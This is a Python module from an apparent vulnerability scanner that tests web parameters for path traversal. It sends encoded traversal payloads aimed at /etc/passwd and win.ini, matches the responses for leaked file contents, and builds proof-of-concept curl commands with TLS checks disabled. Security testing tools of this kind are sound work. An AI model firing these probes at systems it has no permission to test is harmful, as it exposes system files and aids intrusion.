"""Path Traversal Validation Engine (§22).

Detects directory traversal / local file inclusion.
Uses controlled non-destructive probes only.
"""

import hashlib
import logging
import re
from dataclasses import dataclass, field
from typing import List, Optional
from urllib.parse import parse_qs, quote, urlparse

import httpx

logger = logging.getLogger("validator.path_traversal")

# Traversal probes targeting well-known safe files
TRAVERSAL_PROBES = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "C:\\windows\\win.ini",
]

# Response indicators
PASSWD_PATTERN = re.compile(r"root:.*:0:0:", re.I)
WININI_PATTERN = re.compile(r"\[fonts\]|\[extensions\]|\[mci extensions\]", re.I)


@dataclass
class PathTraversalCandidate:
    url: str
    parameter: str
    location: str
    probe: str
    confidence: str = "OBSERVED"
    evidence: dict = field(default_factory=dict)
    poc_curl: str = ""


class PathTraversalValidator:
    """Controlled Path Traversal validator (§22)."""

    def __init__(self, timeout: float = 8.0) -> None:
        self.timeout = timeout

    async def validate_url(
        self,
        url: str,
        parameters: List[dict],
        *,
        headers: Optional[dict] = None,
    ) -> List[PathTraversalCandidate]:
        candidates: List[PathTraversalCandidate] = []

        file_param_names = {"file", "path", "page", "template", "doc", "document",
                            "filename", "filepath", "include", "dir", "folder",
                            "load", "read", "view", "download", "attachment"}

        for param in parameters:
            name = param.get("name", "").lower()
            location = param.get("location", "query")
            if name not in file_param_names:
                continue

            for probe in TRAVERSAL_PROBES:
                candidate = await self._test_traversal(url, param["name"], location, probe, headers)
                if candidate:
                    candidates.append(candidate)
                    break

        logger.info("Path Traversal validation: %d candidates on %s", len(candidates), url)
        return candidates

    async def _test_traversal(
        self,
        url: str,
        param_name: str,
        location: str,
        probe: str,
        headers: Optional[dict] = None,
    ) -> Optional[PathTraversalCandidate]:
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

            async with httpx.AsyncClient(
                timeout=self.timeout, follow_redirects=True, verify=False
            ) as client:
                if location == "query":
                    flat_params[param_name] = probe
                    resp = await client.get(base_url, params=flat_params, headers=headers or {})
                    query_str = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in flat_params.items())
                    final_url = f"{base_url}?{query_str}" if query_str else base_url
                    poc_curl = f"curl -i -s -k -X GET '{final_url}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) HunterAja/9.1.0'"
                else:
                    resp = await client.post(url, data={param_name: probe}, headers=headers or {})
                    data_str = f"{quote(param_name, safe='')}={quote(probe, safe='')}"
                    poc_curl = f"curl -i -s -k -X POST '{base_url}' -d '{data_str}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) HunterAja/9.1.0'"
                    final_url = url

                body = resp.text

                if PASSWD_PATTERN.search(body):
                    return PathTraversalCandidate(
                        url=final_url, parameter=param_name, location=location,
                        probe=probe, confidence="VALIDATED",
                        poc_curl=poc_curl,
                        evidence={
                            "status_code": resp.status_code,
                            "indicator": "/etc/passwd content detected",
                            "response_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                            "poc_curl": poc_curl,
                            "url": final_url,
                            "probe": probe,
                        },
                    )

                if WININI_PATTERN.search(body):
                    return PathTraversalCandidate(
                        url=final_url, parameter=param_name, location=location,
                        probe=probe, confidence="VALIDATED",
                        poc_curl=poc_curl,
                        evidence={
                            "status_code": resp.status_code,
                            "indicator": "win.ini content detected",
                            "response_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                            "poc_curl": poc_curl,
                            "url": final_url,
                            "probe": probe,
                        },
                    )

        except Exception as exc:
            logger.debug("Path traversal test failed for %s: %s", url, exc)

        return None


path_traversal_validator = PathTraversalValidator()
